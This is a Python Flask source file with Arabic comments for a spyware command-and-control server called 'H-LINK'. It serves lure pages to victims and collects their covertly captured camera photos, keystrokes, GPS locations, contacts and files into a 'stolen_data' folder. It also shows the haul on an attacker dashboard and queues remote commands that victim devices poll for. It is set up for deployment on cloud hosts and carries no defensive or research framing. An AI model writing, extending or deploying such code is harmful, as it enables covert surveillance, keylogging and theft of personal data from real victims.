import os
import json
import base64
import socket
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file

# تحديد المسار المطلق
base_dir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__, 
            template_folder=os.path.join(base_dir, 'templates'),
            static_folder=os.path.join(base_dir, 'static'))

app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'secret!')

# مجلد التخزين
STOLEN_DIR = os.path.join(base_dir, "stolen_data")
for folder in ['camera', 'keys', 'location', 'contacts', 'files']:
    os.makedirs(os.path.join(STOLEN_DIR, folder), exist_ok=True)

VICTIM_IP = "Unknown"
CONTROL_QUEUE = []  # قائمة أوامر التحكم

# ========== صفحات الضحية ==========
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/image')
def image_page():
    return render_template('image.html')

@app.route('/qr')
def qr_page():
    return render_template('qr.html')

# ========== لوحة التحكم ==========
@app.route('/dashboard')
def dashboard():
    files = {}
    for cat in ['camera', 'keys', 'location', 'contacts', 'files']:
        try:
            files[cat] = os.listdir(os.path.join(STOLEN_DIR, cat))
        except:
            files[cat] = []
    
    return render_template('dashboard.html', files=files, victim_ip=VICTIM_IP)

# ========== API لجمع البيانات ==========
@app.route('/api/camera', methods=['POST'])
def receive_camera():
    data = request.json
    victim_id = data.get('victim_id', 'unknown')
    photo_type = data.get('type', 'front')
    image_data = data.get('image', '')
    
    if image_data:
        filename = f"{victim_id}_{photo_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        filepath = os.path.join(STOLEN_DIR, 'camera', filename)
        
        image_bytes = base64.b64decode(image_data.split(',')[1] if ',' in image_data else image_data)
        with open(filepath, 'wb') as f:
            f.write(image_bytes)
        
        print(f"[📸] صورة {photo_type}: {filename}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

@app.route('/api/keylog', methods=['POST'])
def receive_keylog():
    data = request.json
    global VICTIM_IP
    VICTIM_IP = request.remote_addr
    
    log_entry = {
        'ip': VICTIM_IP,
        'timestamp': datetime.now().isoformat(),
        'keys': data.get('keys', ''),
        'url': data.get('url', '')
    }
    
    filename = f"keylog_{datetime.now().strftime('%Y%m%d')}.txt"
    filepath = os.path.join(STOLEN_DIR, 'keys', filename)
    
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(json.dumps(log_entry) + '\n')
    
    print(f"[⌨️] Keys: {data.get('keys', '')[:50]}...")
    return jsonify({"status": "ok"})

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.json
    ip = request.remote_addr
    
    loc_entry = {
        'ip': ip,
        'timestamp': datetime.now().isoformat(),
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'accuracy': data.get('accuracy'),
        'maps_link': f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
    }
    
    filepath = os.path.join(STOLEN_DIR, 'location', f"location_{datetime.now().strftime('%Y%m%d')}.json")
    
    with open(filepath, 'a', encoding='utf-8') as f:
        f.write(json.dumps(loc_entry) + '\n')
    
    print(f"[📍] Location: {data.get('lat')}, {data.get('lon')}")
    return jsonify({"status": "ok"})

@app.route('/api/contacts', methods=['POST'])
def receive_contacts():
    data = request.json
    contacts = data.get('contacts', [])
    
    filename = f"contacts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = os.path.join(STOLEN_DIR, 'contacts', filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(contacts, f, indent=2, ensure_ascii=False)
    
    print(f"[👤] Contacts: {len(contacts)} entries")
    return jsonify({"status": "ok"})

@app.route('/api/files', methods=['POST'])
def receive_files():
    data = request.json
    file_data = data.get('file', '')
    filename = data.get('filename', f'file_{datetime.now().strftime("%Y%m%d_%H%M%S")}')
    
    if file_data:
        file_bytes = base64.b64decode(file_data.split(',')[1] if ',' in file_data else file_data)
        filepath = os.path.join(STOLEN_DIR, 'files', filename)
        with open(filepath, 'wb') as f:
            f.write(file_bytes)
        print(f"[📁] File: {filename}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# ========== أوامر التحكم (Polling) ==========
@app.route('/api/control', methods=['POST'])
def control_victim():
    """استلام أمر التحكم من لوحة التحكم"""
    data = request.json
    action = data.get('action')
    
    global CONTROL_QUEUE
    CONTROL_QUEUE.append({
        'action': action,
        'data': data,
        'timestamp': datetime.now().isoformat()
    })
    
    print(f"[🎮] Command queued: {action}")
    return jsonify({"status": f"queued_{action}"})

@app.route('/api/poll', methods=['GET'])
def poll_controls():
    """الضحية يستعلم عن الأوامر"""
    global CONTROL_QUEUE
    if CONTROL_QUEUE:
        cmd = CONTROL_QUEUE.pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": None})

# ========== عرض الملفات المسروقة ==========
@app.route('/stolen/<category>/<filename>')
def serve_stolen(category, filename):
    safe = ['camera', 'keys', 'location', 'contacts', 'files']
    if category not in safe:
        return "Invalid", 400
    return send_file(os.path.join(STOLEN_DIR, category, filename))

# ========== Health Check ==========
@app.route('/health')
def health():
    return jsonify({"status": "ok"})

# ========== تشغيل السيرفر ==========
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════╗
║       H-LINK - Render Ready          ║
╚══════════════════════════════════════╝
    """)
    
    port = int(os.environ.get("PORT", 5000))
    
    print(f"[+] http://0.0.0.0:{port}")
    print(f"[+] Dashboard: /dashboard")
    print(f"[+] Health: /health")
    print("="*40)
    
    # استخدام waitress للإنتاج
    if os.environ.get('RENDER') or os.environ.get('RAILWAY'):
        from waitress import serve
        serve(app, host='0.0.0.0', port=port)
    else:
        app.run(host='0.0.0.0', port=port, debug=True)
